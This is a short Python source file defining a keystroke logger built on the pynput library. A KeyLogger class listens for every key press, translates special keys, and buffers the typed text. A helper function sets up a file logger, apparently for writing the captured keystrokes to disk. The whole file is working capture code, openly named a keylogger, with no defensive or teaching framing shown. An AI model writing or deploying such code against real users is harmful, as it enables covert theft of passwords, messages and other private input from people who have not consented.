from sys import implementation
from pynput.keyboard import Listener, Controller
import threading
import logging

KeyMap = {"space": " ",
          "enter": "\n",
          "shift": "",
          "ctrl_r": "",
          "ctrl_l": "",
          "backspace": ""}

def create_file_logger(filename):
    logger= logging.getLogger()
    logger.setLevel(logging.INFO)
    handler = logging.FileHandler(filename, 'w', 'utf-8')
    handler.setFormatter(logging.Formatter('%(message)s')) 
    handler.terminator = ""
    logger.addHandler(handler)
    return logger

class KeyLogger(Listener):
    def __init__(self):
        Listener.__init__(self)
        self.on_press = self.__on_press_handler
        self.lock = threading.Lock()
        self.__buff = ""
        
    def __on_press_handler(self, key):
        key = str(key)
        if (key.startswith("Key.")): 
            key = key[4:]
            if key in KeyMap: key = KeyMap[key]
            else: key = f'[{key}]'
        else: key = key.strip('\'')
        self.__buff += str(key)
    
    def take_buff(self):
        s = self.__buff
        self.__buff = ""
        return s